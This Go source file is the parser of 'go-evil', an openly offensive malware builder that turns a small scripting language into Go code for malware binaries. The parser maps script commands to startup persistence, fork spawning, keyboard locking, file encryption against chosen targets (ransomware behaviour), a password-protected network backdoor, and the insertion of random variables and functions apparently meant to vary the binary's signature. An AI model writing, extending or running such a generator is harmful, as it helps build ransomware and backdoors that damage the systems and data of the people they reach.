package parser

import (
	"regexp"
	"strings"

	attack_hash "github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash"
	mal "github.com/s9rA16Bf4/go-evil/domains/malware"
	"github.com/s9rA16Bf4/go-evil/utility/io"
	"github.com/s9rA16Bf4/go-evil/utility/variables"
	"github.com/s9rA16Bf4/go-evil/utility/version"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const EXTRACT_MAIN_FUNC = "((main ?: ?{{1,1}(?s).*}))"                             // Grabs the main function
const EXTRACT_MAIN_FUNC_HEADER = "(main:{)"                                        // We use this to identify if there are multiple main functions in the same file
const EXTRACT_FUNCTION_CALL = "([@#a-z]+)\\.([$a-z0-9_]+)\\((\"(.+)\")?\\);"       // Grabs function and a potential value
const EXTRACT_FUNCTION_CALL_WRONG = "([@#a-z]+)\\.([$a-z_]+)\\((\"(.*)\")?\\)[^;]" // And this is utilized to find rows that don't end in ;
const EXTRACT_COMPILER_VERSION = "\\[.?version +([0-9]+\\.[0-9]+).?\\]"            // Extracts the major version
const EXTRACT_VARIABLE = "(\\$[0-9]+)"                                             // Extracts the variable

func Interpeter(file_to_read string) {
	content := io.Read_file(file_to_read)

	regex := regexp.MustCompile(EXTRACT_MAIN_FUNC)
	main_function := regex.FindAllStringSubmatch(content, -1)

	if len(main_function) == 0 { // No main function was found
		notify.Error("Failed to find a main function in the provided file "+file_to_read, "parser.interpeter()")
	}

	regex = regexp.MustCompile(EXTRACT_COMPILER_VERSION) // Extracts the high and medium version
	compiler_version := regex.FindAllStringSubmatch(content, -1)
	if len(compiler_version) == 0 { // Compiler version was never specified
		notify.Error("No compiler version was specificed", "parser.interpeter()")
	} else {
		listed_version := compiler_version[0][1]
		if version.Get_Compiler_version() < listed_version {
			notify.Error("Unknown compiler version "+listed_version, "parser.interpeter()")
		} else if version.Get_Compiler_version() > listed_version {
			notify.Warning("You're running a script for an older version of the compiler.\nThis means that there might be functions/syntaxes that have changed")
		}
	}

	regex = regexp.MustCompile(EXTRACT_MAIN_FUNC_HEADER)
	main_header := regex.FindAllStringSubmatch(content, -1)
	if len(main_header) > 1 { // Multiple main functions were defined
		notify.Error("Found multiple main definitions in the provided file "+file_to_read, "parser.interpeter()")
	}
	regex = regexp.MustCompile(EXTRACT_FUNCTION_CALL_WRONG)
	match := regex.FindAllStringSubmatch(content, -1)
	if len(match) > 0 {
		line := match[0][0]
		line = strings.ReplaceAll(line, "\n", "")
		notify.Error("The line '"+line+"' in the file "+file_to_read+" is missing a semi-colon", "parser.interpeter()")
	}

	regex = regexp.MustCompile(EXTRACT_FUNCTION_CALL)
	match = regex.FindAllStringSubmatch(content, -1)
	for _, funct := range match {
		notify.Log("Found possible domain "+funct[1], notify.Verbose_lvl, "3")
		if funct[1][0] == '@' { // Found a comment at the start, so we will ignore this one
			notify.Log("Found comment, will ignore this line", notify.Verbose_lvl, "3")
			continue
		}

		regex = regexp.MustCompile(EXTRACT_VARIABLE)
		variable := regex.FindAllStringSubmatch(funct[4], -1)
		if len(variable) > 0 { // We found a variable
			funct[4] = strings.Replace(funct[4], variable[0][1], variables.Get_variable(variable[0][1]), 1) // so we replace it with it's value
			notify.Log("Found variable "+variable[0][1]+" which contained the value "+variables.Get_variable(variable[0][1]), notify.Verbose_lvl, "2")
		}

		switch funct[1] {

		case "window": // The window domain was called
			io.Append_domain("window")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
			switch funct[2] { // Checks the function that were called from the domain
			case "x":
				mal.AddContent("win.SetX(\"" + funct[4] + "\")")
			case "y":
				mal.AddContent("win.SetY(\"" + funct[4] + "\")")

			case "title":
				mal.AddContent("win.SetTitle(\"" + funct[4] + "\")")

			case "goto":
				mal.AddContent("win.GoToUrl(\"" + funct[4] + "\")")

			case "display":
				mal.AddContent("win.Display(\"" + funct[4] + "\")")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		case "system": // The system domain was called
			io.Append_domain("system")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] { // Function within this domain
			case "exit":
				mal.AddContent("sys.System_exit(\"" + funct[4] + "\")")

			case "out":
				mal.AddContent("sys.System_out(\"" + funct[4] + "\")")
			case "add_to_startup":
				mal.AddContent("sys.AddToStartup()")
			case "spawn":
				io.Append_domain("syscall") // Needed
				mal.AddContent("syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		case "malware", "#object", "#self", "#this": // We are gonna modify the binary in some way
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] {
			case "name":
				mal.SetBinaryName(funct[4])
			case "extension":
				mal.SetExtension(funct[4])
			case "add_random_variable":
				io.Append_domain("fmt") // Otherwise the malware wont compile
				mal.AddRandomVariable()
			case "add_random_function":
				mal.AddRandomFunction()

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		case "time", "#wait": // Somebody wants to utilize our wait functionallity
			io.Append_domain("time")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] {
			case "run":
				mal.AddContent("time.Run()")
			case "year":
				mal.AddContent("time.SetYear(\"" + funct[4] + "\")")
			case "month":
				mal.AddContent("time.SetMonth(\"" + funct[4] + "\")")
			case "day":
				mal.AddContent("time.SetDay(\"" + funct[4] + "\")")
			case "hour":
				mal.AddContent("time.SetHour(\"" + funct[4] + "\")")
			case "min":
				mal.AddContent("time.SetMin(\"" + funct[4] + "\")")
			case "until":
				mal.AddContent("time.Until(\"" + funct[4] + "\")")
			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}
		case "keyboard":
			io.Append_domain("keyboard")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")

			switch funct[2] {
			case "lock":
				mal.AddContent("keyboard.Lock()")
			case "unlock":
				mal.AddContent("keyboard.Unlock()")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}
		case "attack":
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
			switch funct[2] {
			case "set_target", "set_encryption", "encrypt", "decrypt", "set_extension":
				io.Append_domain("attack_encrypt")
				switch funct[2] {
				case "set_target":
					mal.AddContent("attack_encrypt.SetTarget(\"" + funct[4] + "\")")
				case "set_encryption":
					mal.AddContent("attack_encrypt.SetEncryptionMethod(\"" + funct[4] + "\")")
				case "encrypt":
					mal.AddContent("attack_encrypt.Encrypt()")
				case "decrypt":
					mal.AddContent("attack_encrypt.Decrypt()")

				case "set_extension":
					mal.AddContent("attack_encrypt.SetExtension(\"" + funct[4] + "\")")

				}

			// Hash, everything here is done in realtime when compiling.
			case "set_hash":
				attack_hash.Set_hash(funct[4])
			case "hash":
				attack_hash.Hash(funct[4])

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		case "backdoor":
			io.Append_domain("backdoor")
			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
			switch funct[2] {
			case "set_port":
				mal.AddContent("back.Set_port(\"" + funct[4] + "\")")
			case "start":
				mal.AddContent("back.Start()")
			case "stop":
				mal.AddContent("back.Close()")
			case "serve":
				mal.AddContent("back.Serve()")
			case "read_size":
				mal.AddContent("back.Set_read_size(\"" + funct[4] + "\")")

			case "welcome":
				mal.AddContent("back.Set_welcome_msg(\"" + funct[4] + "\")")

			case "enable_login":
				mal.AddContent("back.Enable_login()")
			case "disable_login":
				mal.AddContent("back.Disable_login()")

			case "user":
				mal.AddContent("back.Set_username(\"" + funct[4] + "\")")
			case "password":
				mal.AddContent("back.Set_password(\"" + funct[4] + "\")")
			case "set_hash":
				mal.AddContent("back.Set_hash(\"" + funct[4] + "\")")

			default:
				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
			}

		default:
			notify.Error("Unknown domain '"+funct[1]+"'", "parser.interpeter()")
		}
	}
}
